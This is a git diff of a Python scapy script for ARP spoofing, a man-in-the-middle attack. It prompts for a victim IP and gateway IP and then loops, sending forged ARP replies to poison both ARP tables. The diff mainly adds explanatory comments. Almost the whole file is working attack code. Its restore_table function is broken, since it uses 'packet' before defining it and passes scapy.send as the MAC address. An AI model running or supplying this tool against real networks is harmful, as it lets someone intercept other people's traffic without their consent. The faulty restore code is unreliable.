@@ -4,6 +4,11 @@ import scapy.all as scapy
 import time 
 import sys 
 
+# pdst = where the packets should be sent
+# psrc = ip to update in victim's arp table
+# hwsrc = MAC address corresponding to the psrc to update victim's arp table
+# hwdst = destination of MAC address
+
 # function for getting the mac address 
 def mac_address(ip_address): 
     arp_request = scapy.ARP(pdst = ip_address) # creating an arp request with whatever ip is inputted
@@ -16,25 +21,28 @@ def mac_address(ip_address):
 def spoof(target_ip, spoof_ip): 
     # making a packet that modifies the ARP table of our victim and the gateway
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac_address(target_ip), 
-                                                                psrc=spoof_ip) 
-    scapy.send(packet, verbose=False)
-
+                                                               psrc=spoof_ip) 
+    scapy.send(packet, verbose=False) # sending the packet
+# function for restoring the whole arp table 
 def restore_table(dest_ip, source_ip):
-    dest_mac = mac_address(dest_ip)
-    source_mac = mac_address(source_ip)
-    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=scapy.send(packet, verbose=True))
+    dest_mac = mac_address(dest_ip)  
+    source_mac = mac_address(source_ip) 
+    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=scapy.send(packet, verbose=True)) 
 
 target_ip = input("> Victim IP: ")
 gateway_ip = input("> Gateway IP: ")
 
+# making a try loop because we want to update the arp table from start to end and not stop 
 try: 
-    packets_sent = 0 
+    packets_sent = 0 # number of packets sent
     while True: 
-        spoof(target_ip, gateway_ip)
+        # spoofing the victim
+        spoof(target_ip, gateway_ip) 
         spoof(gateway_ip, target_ip)
-        packets_sent = packets_sent + 2
-        print("> Total Packets Sent: " + str(packets_sent))
-        time.sleep(1)
+        packets_sent = packets_sent + 2 # incrementing sent packets
+        print("> Total Packets Sent: " + str(packets_sent)) 
+        time.sleep(1) # 1 second delay 
+# if we ctrl+c the program ends and we restore victim's arp table
 except KeyboardInterrupt: 
     print("> Program Interrupted")
     restore_table(gateway_ip, target_ip)
